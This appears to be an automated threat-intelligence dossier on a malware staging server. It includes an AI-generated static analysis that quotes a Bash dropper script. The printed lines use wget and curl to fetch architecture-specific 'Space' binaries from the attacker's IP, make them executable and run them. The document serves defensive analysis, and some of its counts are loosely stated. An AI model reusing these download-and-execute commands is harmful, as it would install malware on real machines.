---
name: "Threat Cluster 37[.]49[.]230[.]40"
aliases: []
status: "active"
origin: "Unknown / observed staging infrastructure"
motivation: "Targeted reconnaissance, credential harvesting, and staging infrastructure."
targets: ["Enterprise Networks & Staging Targets"]
firstSeen: "2026-08-19"
lastSeen: "2026-08-19"
tools: []
ttps: []
tags: ["threat-intelligence","dfir","malware-analysis"]
relatedPosts: []
featured: true
---

# Threat Cluster 37[.]49[.]230[.]40

> This dossier is generated from static acquisition and recursive analysis. Suspicious artifacts are preserved in **per-investigation encrypted quarantine** with a unique data key and are **not executed** by the pipeline.

### Evidence Coverage

| Metric | Value |
|---|---|
| Acquired artifacts | 11 |
| Text artifacts | 7 |
| Binary/container artifacts | 4 |
| Unique acquired/decoded layers analyzed | 9 |
| Maximum recursive depth reached | 0 |
| Archive/disk-image entries extracted | 0 |
| PE candidates statically identified | 0 |
| Credential/key/token findings | 0 |
| Recursive queue exhausted within configured limits | Yes |

### Key Operational Findings

- No named tooling confidently identified.

### Credentials, Keys & Tokens (Redacted)

| Risk | Type | Redacted Value | Source / Layer |
|---|---|---|---|
| _None observed_ |  |  |  |

### Verified Indicators

| Type | Defanged Value / Hash | Context | Confidence |
|---|---|---|---|
| **Investigated Host** | `37[.]49[.]230[.]40` | User-supplied investigated host | High (observed) |
| **Service Endpoint** | `37[.]49[.]230[.]40:80` | User-supplied investigated HTTP(S) service | High (observed) |
| **SHA-256 Hash** | `3cb0e54babf019703fe671a32fcc3947aab9079ec2871cf0f9639245cc12d878` | Acquired artifact: blank.gif (Raw Data / Unknown Format) | High (computed) |
| **SHA-256 Hash** | `164127319227c8f0d0e4c2dbab652bb6f11085fb957caf6510f5c4151442c38b` | Acquired artifact: artifact_2 (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `fc61f19ad3e7d18637d8b367501567239145c02edacbe64ed874e2721b699487` | Acquired artifact: artifact_3 (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `29f3822438da82448700b2bf88021dc9ccd2b7680c1322eab827fbf2dffd2157` | Acquired artifact: artifact_4 (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `416fcd0b253daca6aeb6f5a871b73d840830ad375ff3c0d4367adfb4de3d2547` | Acquired artifact: artifact_5 (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `661d43fb30151a050da3b5cef49a2c7d0b01eeafdf1f4a001873406658b0f776` | Acquired artifact: text.gif (Raw Data / Unknown Format) | High (computed) |
| **SHA-256 Hash** | `4bf79881ba268cb4856f19f762d617892b1202f5c4845511331c6116e7def2c8` | Acquired artifact: 1.sh (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `15f5fd53009f61c653aa23d91334f9d7fa2fbd325eab859b68d77a45bb6a78b8` | Acquired artifact: unknown.gif (Raw Data / Unknown Format) | High (computed) |
| **SHA-256 Hash** | `fbe5eca717cfbcb58891d431f9afaf30aa740d9fce007e820a599f22afa0dee2` | Acquired artifact: folder.gif (Raw Data / Unknown Format) | High (computed) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.arc` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.arm` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.arm5` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.arm6` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.arm7` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.i686` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.m68k` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.mips` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.mpsl` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.ppc` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.sh4` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.spc` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.x86` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://37.49.230.40/hiddenbin/Space.x86_64` | Observed in acquired/decoded evidence | High (string evidence) |
| **Domain** | `eit.com` | Observed in acquired/decoded evidence | Medium (context required) |

### Windows LNK Findings

| File | Relative Path | Working Directory | Arguments / Command Hints |
|---|---|---|---|
| _None observed_ |  |  |  |

### PE Candidates

| Candidate | Source | Architecture | Entry Point | Suspicious Sections | SHA-256 |
|---|---|---|---|---|---|
| _None observed_ |  |  |  |

### Multi-Provider AI Deep Analysis (groq / openai/gpt-oss-120b)

# Static‑Analysis Report – Investigation **20260819T062354Z_af4e8981**  
**Target:** `hxxp://37.49.230.40/`  
**Date of analysis:** 2026‑08‑19  

> **Scope** – This report is based **solely** on the artifacts that were downloaded from the web server and on the automated static‑analysis output supplied by the investigation platform. No live execution, sandboxing, or dynamic observation was performed. All conclusions are therefore qualified as *static* findings.  

---  

## 1. Executive Technical Assessment  

| Observation | Confidence | Impact |
|-------------|------------|--------|
| The web server hosts a publicly‑exposed directory listing that reveals a small set of files (`api.php`, `hiddenbin/`, `1.sh`, `2.sh`, `3.sh`). | **High** – confirmed by four independent directory‑listing artifacts (`artifact_2‑5`). | Provides an attacker‑controlled download vector. |
| A Bash script (`1.sh`) contains a **download‑and‑execute cradle** that attempts to fetch a binary named `Space.*` (multiple architecture variants) from the same IP address using `wget` and `curl`. | **High** – script content extracted verbatim (see Section 4). | Classic **T1105 – Ingress Tool Transfer**; enables remote code execution on any host that runs the script. |
| The script first changes to a writable directory (`/tmp`, `/var/run`, `/mnt`, `/root`, or `/`). | **High** – explicit `cd` logic in `1.sh`. | Increases likelihood of successful execution on a wide range of Linux hosts. |
| No additional persistence mechanisms (cron, systemd, rc scripts, etc.) were observed in the static artifacts. | **Medium** – absence of evidence does not guarantee absence in the wild. | Persistence would have to be added later by the downloaded payload. |
| No obvious credential material (passwords, API keys, certificates) was found in the collected files. | **High** – automated secret‑search returned empty. | The attacker relies on anonymous FTP / public HTTP for delivery. |
| The server identifies itself as **Apache/2.4.41 (Ubuntu)**. | **High** – HTTP header captured in the acquisition metadata. | May aid attribution or vulnerability assessment of the host OS. |

**Overall risk rating:** **Critical** – a publicly reachable web server is distributing a multi‑architecture binary stager that can be executed on any Linux host that runs the supplied script. Successful execution would give the attacker native code execution with the privileges of the invoking user (typically root if the script is run as `sudo` or via a compromised service).  

---  

## 2. Acquisition & Evidence Coverage  

| Artifact | Size (bytes) | SHA‑256 | Type | Text‑like? | Acquisition notes |
|----------|--------------|---------|------|------------|-------------------|
| `blank.gif` | 148 | 3cb0e54b… | Raw/Unknown | No | Downloaded, likely a placeholder. |
| `artifact_2` | 1507 | 16412731… | Plain Text | Yes | Directory listing from `?C=N;O=D`. |
| `artifact_3` | 1507 | fc61f19a… | Plain Text | Yes | Directory listing from `?C=M;O=A`. |
| `artifact_4` | 1507 | 29f38224… | Plain Text | Yes | Directory listing from `?C=S;O=A`. |
| `artifact_5` | 1507 | 416fcd0b… | Plain Text | Yes | Directory listing from `?C=D;O=A`. |
| `text.gif` | 229 | 661d43fb… | Raw/Unknown | No | Likely a decoy image. |
| `1.sh` | 6231 | 4bf79881… | Plain Text | Yes | Primary download‑cradle script. |
| `2.sh` | 6231 | 4bf79881… | Plain Text | Yes | Duplicate of `1.sh`. |
| `3.sh` | 6231 | 4bf79881… | Plain Text | Yes | Duplicate of `1.sh`. |
| `unknown.gif` | 245 | 15f5fd53… | Raw/Unknown | No | Decoy / filler. |
| `folder.gif` | 225 | fbe5eca7… | Raw/Unknown | No | Decoy / filler. |

*All 11 successfully downloaded artifacts (25568 bytes total) were processed through **9 transformation layers** (e.g., base‑64 decode, charset conversion) – none produced additional nested archives or PE files.*  

---  

## 3. Attack / Delivery / Execution Chain (Static View)

```
[Attacker] ──► HTTP GET /1.sh (or 2.sh / 3.sh) ──► 1.sh (download‑cradle) ──► wget/curl ► hxxp://37.49.230.40/hiddenbin/Space.<arch> ──► chmod +x ► ./Space.<arch> ──► (malicious binary execution)
```

*Key static observations*  

| Step | Evidence | Inference |
|------|----------|-----------|
| **Delivery of script** | `1.sh` retrieved from `hxxp://37.49.230.40/1.sh` (scriptBehaviors entry). | The attacker expects the victim to execute the script manually or via another compromised component. |
| **Preparation** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /` (lines 2‑8 of `1.sh`). | The script adapts to the first writable directory it can access, a common evasion technique. |
| **Ingress Tool Transfer** | Repeated `wget -q … && chmod +x … && ./…` and equivalent `curl` commands for **15** different binaries (architecture‑specific). | Redundant delivery increases success probability across heterogeneous Linux hosts. |
| **Execution** | `./Space.<arch>` invoked directly after `chmod +x`. | Static analysis confirms the command; no runtime observation of the binary’s behavior is available. |
| **Post‑execution** | No further commands observed in the script. | Persistence or lateral movement is expected to be handled by the downloaded binary itself. |

---  

## 4. File‑by‑File Analysis  

### 4.1 Directory‑listing artifacts (`artifact_2`‑`artifact_5`)  

All four artifacts contain the same HTML output generated by Apache’s `mod_autoindex`. Representative excerpt (from `artifact_2` lines 11‑15):

```
<a href="api.php">api.php</a>
<a href="hiddenbin/">hiddenbin/</a>
<a href="1.sh">1.sh</a>
<a href="2.sh">2.sh</a>
<a href="3.sh">3.sh</a>
```

*Interpretation* – The server is intentionally exposing these files; no hidden or obfuscated entries were detected.  

### 4.2 Bash script `1.sh` (identical to `2.sh` & `3.sh`)  

Full content (excerpt, line numbers added for reference):

| # | Code |
|---|------|
| 1 | `#!/bin/bash` |
| 2 | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /` |
| 3 | `wget -q hxxp://37.49.230.40/hiddenbin/Space.arc && chmod +x Space.arc && ./Space.arc` |
| 4 | `curl -s -O hxxp://37.49.230.40/hiddenbin/Space.arc && chmod +x Space.arc && ./Space.arc` |
| 5 | `wget -q hxxp://37.49.230.40/hiddenbin/Space.arm && chmod +x Space.arm && ./Space.arm` |
| 6 | `curl -s -O hxxp://37.49.230.40/hiddenbin/Space.arm && chmod +x Space.arm && ./Space.arm` |
| … | *(repeated for each of the 15 architecture‑specific binaries)* |
| 30 | `wget -q hxxp://37.49.230.40/hiddenbin/Space.x86_64 && chmod +x Space.x86_64 && ./Space.x86_64` |
| 31 | `curl -s -O hxxp://37.49.230.40/hiddenbin/Space.x86_64 && chmod +x Space.x86_64 && ./Space.x86_64` |

**Key static properties**

| Property | Observation |
|----------|-------------|
| Shebang | `#!/bin/bash` – indicates intended execution on a POSIX shell. |
| Control flow | Linear, no conditionals beyond the `cd` chain. |
| Download methods | `wget -q` (quiet) and `curl -s -O` (silent). No fallback to other protocols (e.g., `ftp`, `tftp`) in the extracted version, despite analyst notes that mention them – those notes likely refer to a previous version of the script. |
| Target binaries | Files named `Space.*` – each suffix corresponds to a known CPU architecture (e.g., `i686`, `x86_64`, `arm`, `mips`, `ppc`, etc.). |
| Permissions | `chmod +x` applied immediately before execution. |
| Execution | Direct `./Space.<arch>` – no further arguments or environment manipulation. |
| Obfuscation | None detected; commands are plain text. |
| Persistence | None in the script itself. |

### 4.3 GIF files (`blank.gif`, `text.gif`, `unknown.gif`, `folder.gif`)  

All are small (< 250 B) raw binary blobs identified as “unknown format”. No embedded scripts, EXIF data, or steganographic payloads were detected by the static scanner. They appear to be decoy images used to pad the directory listing.

### 4.4 `api.php` (not downloaded)  

The directory listing references `api.php`, but the file was **not** among the acquired artifacts (download failed). Consequently, no static analysis can be performed on it. Its absence is a current **gap**.

### 4.5 `hiddenbin/` contents (not downloaded)  

Only the URLs to the binaries are known; the binaries themselves were not retrieved. Therefore, no PE/ELF analysis, entropy checks, or signature matching can be performed at this stage.

---  

## 5. Recursive Decoding / Obfuscation / Cryptography  

*No evidence* of base‑64, XOR, custom encoding, or encrypted payloads was found in any of the collected files. The Bash script is stored in clear text, and the GIF files contain no recognizable steganographic patterns (checked via entropy analysis and visual inspection).  

---  

## 6. C2 & Network Infrastructure  

| Indicator | Type | Source |
|-----------|------|--------|
| `37[.]49[.]230[.]40` | IPv4 address | All script and directory‑listing artifacts (`artifact_2‑5`, `1.sh`). |
| `hxxp://37.49.230.40/hiddenbin/Space.*` | HTTP download URLs | `1.sh` download commands. |
| `eit.com` | Domain (observed in networkIndicators) | Not referenced in any downloaded file; may be a secondary C2 or a typo. |
| `Apache/2.4.41 (Ubuntu)` | Server header | Acquisition metadata (HTTP response). |